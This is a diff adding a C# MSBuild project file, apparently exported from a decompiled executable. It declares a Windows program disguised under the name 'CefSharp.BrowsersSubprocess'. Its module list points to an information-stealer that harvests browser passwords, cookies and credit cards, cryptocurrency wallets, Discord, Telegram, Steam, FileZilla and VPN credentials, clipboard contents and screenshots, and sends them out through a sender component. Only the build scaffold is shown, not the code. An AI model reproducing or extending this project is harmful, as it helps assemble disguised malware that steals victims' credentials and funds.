@@ -1,0 +1,136 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!--Project was exported from assembly: C:\Users\pitsc\hannibal1.exe-->
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{0EA04CEA-FF13-426E-8C33-531603D6332E}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>CefSharp.BrowsersSubprocess</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>1.0.1.1</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>SHARP</RootNamespace>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>SHARP.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO, Version=4.1.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.4.3.0\lib\net462\System.IO.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.IO.Compression, Version=4.1.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
+      <HintPath>packages\System.IO.Compression.4.3.0\lib\net46\System.IO.Compression.dll</HintPath>
+      <Private>True</Private>
+      <Private>True</Private>
+    </Reference>
+    <Reference Include="System.Management" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="AesGcm.cs" />
+    <Compile Include="BCrypt.cs" />
+    <Compile Include="GDecryptor.cs" />
+    <Compile Include="Browsers.cs" />
+    <Compile Include="BRWSR.cs" />
+    <Compile Include="PathsCV20.cs" />
+    <Compile Include="V20Collect.cs" />
+    <Compile Include="PasswordFormat.cs" />
+    <Compile Include="CookieFormat.cs" />
+    <Compile Include="AutoFilesFormat.cs" />
+    <Compile Include="CreditCardFormat.cs" />
+    <Compile Include="GBRWSR.cs" />
+    <Compile Include="Writer.cs" />
+    <Compile Include="Clipboard.cs" />
+    <Compile Include="Monitor.cs" />
+    <Compile Include="Patterns.cs" />
+    <Compile Include="Config.cs" />
+    <Compile Include="StartWallets.cs" />
+    <Compile Include="Armory.cs" />
+    <Compile Include="AtomicWallet.cs" />
+    <Compile Include="BitcoinCore.cs" />
+    <Compile Include="Bytecoin.cs" />
+    <Compile Include="DashCore.cs" />
+    <Compile Include="Electrum.cs" />
+    <Compile Include="Ethereum.cs" />
+    <Compile Include="Exodus.cs" />
+    <Compile Include="Jaxx.cs" />
+    <Compile Include="LitecoinCore.cs" />
+    <Compile Include="Metamask.cs" />
+    <Compile Include="Monero.cs" />
+    <Compile Include="Zcash.cs" />
+    <Compile Include="Discord.cs" />
+    <Compile Include="dst.cs" />
+    <Compile Include="DiscordAccountFormat.cs" />
+    <Compile Include="Files.cs" />
+    <Compile Include="GetFiles.cs" />
+    <Compile Include="IFolders.cs" />
+    <Compile Include="FileZilla.cs" />
+    <Compile Include="TotalCommander.cs" />
+    <Compile Include="Counting.cs" />
+    <Compile Include="Filemanager.cs" />
+    <Compile Include="Help.cs" />
+    <Compile Include="ProcessList.cs" />
+    <Compile Include="IP.cs" />
+    <Compile Include="LocationInfo.cs" />
+    <Compile Include="Otstuk.cs" />
+    <Compile Include="OMethod.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="SQLiteHandler.cs" />
+    <Compile Include="Screenchik.cs" />
+    <Compile Include="SenderAPI.cs" />
+    <Compile Include="Steam.cs" />
+    <Compile Include="BSSID.cs" />
+    <Compile Include="Buffers.cs" />
+    <Compile Include="SystemInfo.cs" />
+    <Compile Include="WinAPI.cs" />
+    <Compile Include="Telegram.cs" />
+    <Compile Include="CyberGhost.cs" />
+    <Compile Include="ExpressVPN.cs" />
+    <Compile Include="NordVPN.cs" />
+    <Compile Include="OpenVPN.cs" />
+    <Compile Include="PIAVPN.cs" />
+    <Compile Include="ProtonVPN.cs" />
+    <Compile Include="StartVPN.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Properties\Resources.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+    <None Include="packages.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
